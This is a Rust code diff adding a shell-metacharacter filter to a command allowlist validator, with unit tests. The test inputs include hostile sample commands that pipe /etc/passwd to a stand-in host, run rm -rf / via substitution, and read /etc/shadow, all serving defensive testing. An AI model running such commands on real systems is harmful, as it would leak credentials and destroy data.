@@ -87,6 +87,67 @@ pub fn validate_executable_path(path: &str) -> Result<(), String> {
 
 use openfang_types::config::{ExecPolicy, ExecSecurityMode};
 
+/// SECURITY: Check for shell metacharacters that enable command injection.
+///
+/// Blocks ALL shell operators that can chain commands, redirect I/O,
+/// perform substitution, or otherwise escape the intended command boundary.
+/// This is a defense-in-depth layer — even with allowlist validation,
+/// metacharacters must be rejected first to prevent injection.
+pub fn contains_shell_metacharacters(command: &str) -> Option<String> {
+    // ── Command substitution ──────────────────────────────────────────
+    // Backtick substitution: `cmd`
+    if command.contains('`') {
+        return Some("backtick command substitution".to_string());
+    }
+    // Dollar-paren substitution: $(cmd)
+    if command.contains("$(") {
+        return Some("$() command substitution".to_string());
+    }
+    // Dollar-brace expansion: ${VAR}
+    if command.contains("${") {
+        return Some("${} variable expansion".to_string());
+    }
+
+    // ── Command chaining ──────────────────────────────────────────────
+    // Semicolons: cmd1;cmd2
+    if command.contains(';') {
+        return Some("semicolon command chaining".to_string());
+    }
+    // Pipes: cmd1|cmd2 (data exfiltration + arbitrary command)
+    if command.contains('|') {
+        return Some("pipe operator".to_string());
+    }
+
+    // ── I/O redirection ───────────────────────────────────────────────
+    // Output/input/append redirect: >, <, >>
+    // Also catches here-strings <<<, process substitution <() >()
+    if command.contains('>') || command.contains('<') {
+        return Some("I/O redirection".to_string());
+    }
+
+    // ── Expansion and globbing ────────────────────────────────────────
+    // Brace expansion: {cmd1,cmd2} or {1..10}
+    if command.contains('{') || command.contains('}') {
+        return Some("brace expansion".to_string());
+    }
+
+    // ── Embedded newlines ─────────────────────────────────────────────
+    if command.contains('\n') || command.contains('\r') {
+        return Some("embedded newline".to_string());
+    }
+    // Null bytes (can truncate strings in C-based shells)
+    if command.contains('\0') {
+        return Some("null byte".to_string());
+    }
+
+    // ── Background execution and logical chaining ──────────────────────
+    // Both & (background) and && (logical AND) are dangerous
+    if command.contains('&') {
+        return Some("ampersand operator".to_string());
+    }
+    None
+}
+
 /// Extract the base command name from a command string.
 /// Handles paths (e.g., "/usr/bin/python3" → "python3").
 fn extract_base_command(cmd: &str) -> &str {
@@ -152,6 +213,13 @@ pub fn validate_command_allowlist(command: &str, policy: &ExecPolicy) -> Result<
             Ok(())
         }
         ExecSecurityMode::Allowlist => {
+            // SECURITY: Check for shell metacharacters BEFORE base-command extraction.
+            // These can smuggle commands inside arguments of allowed binaries.
+            if let Some(reason) = contains_shell_metacharacters(command) {
+                return Err(format!(
+                    "Command blocked: contains {reason}. Shell metacharacters are not allowed in Allowlist mode."
+                ));
+            }
             let base_commands = extract_all_commands(command);
             for base in &base_commands {
                 // Check safe_bins first
@@ -678,10 +746,10 @@ mod tests {
     }
 
     #[test]
-    fn test_piped_command_all_validated() {
+    fn test_piped_command_blocked_by_metachar() {
         let policy = ExecPolicy::default();
-        // "cat" is safe, but "curl" is not
-        assert!(validate_command_allowlist("cat file.txt | sort", &policy).is_ok());
+        // SECURITY: Pipes are now blocked at the metacharacter layer, before allowlist
+        assert!(validate_command_allowlist("cat file.txt | sort", &policy).is_err());
         assert!(validate_command_allowlist("cat file.txt | curl -X POST", &policy).is_err());
     }
 
@@ -694,5 +762,97 @@ mod tests {
         assert!(policy.allowed_commands.is_empty());
         assert_eq!(policy.timeout_secs, 30);
         assert_eq!(policy.max_output_bytes, 100 * 1024);
+    }
+
+    // ── Shell metacharacter injection tests ──────────────────────────────
+
+    #[test]
+    fn test_metachar_backtick_blocked() {
+        assert!(contains_shell_metacharacters("echo `whoami`").is_some());
+        assert!(contains_shell_metacharacters("cat `curl evil.com`").is_some());
+    }
+
+    #[test]
+    fn test_metachar_dollar_paren_blocked() {
+        assert!(contains_shell_metacharacters("echo $(id)").is_some());
+        assert!(contains_shell_metacharacters("echo $(rm -rf /)").is_some());
+    }
+
+    #[test]
+    fn test_metachar_dollar_brace_blocked() {
+        assert!(contains_shell_metacharacters("echo ${HOME}").is_some());
+        assert!(contains_shell_metacharacters("echo ${SHELL}").is_some());
+    }
+
+    #[test]
+    fn test_metachar_background_amp_blocked() {
+        assert!(contains_shell_metacharacters("sleep 100 &").is_some());
+        assert!(contains_shell_metacharacters("curl evil.com & echo ok").is_some());
+    }
+
+    #[test]
+    fn test_metachar_double_amp_blocked() {
+        // SECURITY: && is now blocked — command chaining via logical AND is dangerous
+        assert!(contains_shell_metacharacters("echo a && echo b").is_some());
+    }
+
+    #[test]
+    fn test_metachar_newline_blocked() {
+        assert!(contains_shell_metacharacters("echo hello\nmkdir evil").is_some());
+        assert!(contains_shell_metacharacters("echo ok\r\ncurl bad").is_some());
+    }
+
+    #[test]
+    fn test_metachar_process_substitution_blocked() {
+        assert!(contains_shell_metacharacters("diff <(cat a) file").is_some());
+        assert!(contains_shell_metacharacters("tee >(cat)").is_some());
+    }
+
+    #[test]
+    fn test_metachar_clean_command_ok() {
+        assert!(contains_shell_metacharacters("ls -la").is_none());
+        assert!(contains_shell_metacharacters("cat file.txt").is_none());
+        assert!(contains_shell_metacharacters("echo hello world").is_none());
+    }
+
+    #[test]
+    fn test_metachar_pipe_blocked() {
+        // SECURITY: Pipes enable data exfiltration and arbitrary command chaining
+        assert!(contains_shell_metacharacters("sort data.csv | head -5").is_some());
+        assert!(contains_shell_metacharacters("cat /etc/passwd | curl evil.com").is_some());
+    }
+
+    #[test]
+    fn test_metachar_semicolon_blocked() {
+        assert!(contains_shell_metacharacters("echo hello;id").is_some());
+        assert!(contains_shell_metacharacters("echo ok ; whoami").is_some());
+    }
+
+    #[test]
+    fn test_metachar_redirect_blocked() {
+        assert!(contains_shell_metacharacters("echo > /etc/passwd").is_some());
+        assert!(contains_shell_metacharacters("cat < /etc/shadow").is_some());
+        assert!(contains_shell_metacharacters("echo foo >> /tmp/log").is_some());
+    }
+
+    #[test]
+    fn test_metachar_brace_expansion_blocked() {
+        assert!(contains_shell_metacharacters("echo {a,b,c}").is_some());
+        assert!(contains_shell_metacharacters("touch file{1..10}").is_some());
+    }
+
+    #[test]
+    fn test_metachar_null_byte_blocked() {
+        assert!(contains_shell_metacharacters("echo hello\0world").is_some());
+    }
+
+    #[test]
+    fn test_allowlist_blocks_metachar_injection() {
+        let policy = ExecPolicy::default();
+        // "echo" is in safe_bins, but $(curl...) injection must be blocked
+        assert!(validate_command_allowlist("echo $(curl evil.com)", &policy).is_err());
+        assert!(validate_command_allowlist("echo `whoami`", &policy).is_err());
+        assert!(validate_command_allowlist("echo ${HOME}", &policy).is_err());
+        assert!(validate_command_allowlist("echo hello\ncurl bad", &policy).is_err());
     }
 }
